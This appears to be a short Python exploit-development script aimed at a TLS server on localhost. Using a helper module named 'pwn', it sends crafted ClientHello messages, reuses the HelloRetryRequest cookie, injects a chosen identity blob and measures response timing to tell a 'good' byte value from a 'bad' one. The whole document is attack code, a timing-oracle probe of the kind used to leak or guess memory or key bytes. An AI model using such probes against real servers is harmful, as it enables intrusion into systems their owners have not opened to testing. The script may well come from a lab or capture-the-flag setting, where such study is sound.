import socket, time, pwn, statistics, sys

def one(sni_len, blob):
    s = socket.create_connection(('127.0.0.1',1443), timeout=5)
    pwn.send_hs(s, pwn.build_ch(pwn.make_sni(sni_len), identity=None, key_share=None))
    r1 = pwn.read_all(s, 0.8)
    ck = pwn.hrr_cookie(r1)
    pwn.send_hs(s, pwn.build_ch(pwn.make_sni(sni_len), identity=blob, cookie=ck))
    pwn.read_all(s, 0.5)
    t0=time.perf_counter()
    try: s.sendall(bytes([0x15,3,3,0,2,1,0]))
    except Exception: pass
    s.settimeout(2.0)
    try:
        while True:
            b=s.recv(4096)
            if not b: break
    except Exception: pass
    dt=time.perf_counter()-t0
    s.close()
    return dt

good=bytearray(8); good[1]=0x2c
bad=bytearray(8); bad[1]=0x2d
for name, c in (("good", good), ("bad", bad)):
    ts=[one(0x5a, pwn.make_blob(bytes(c))) for _ in range(6)]
    print(name, [round(x*1000,1) for x in ts], "median", round(statistics.median(ts)*1000,1))
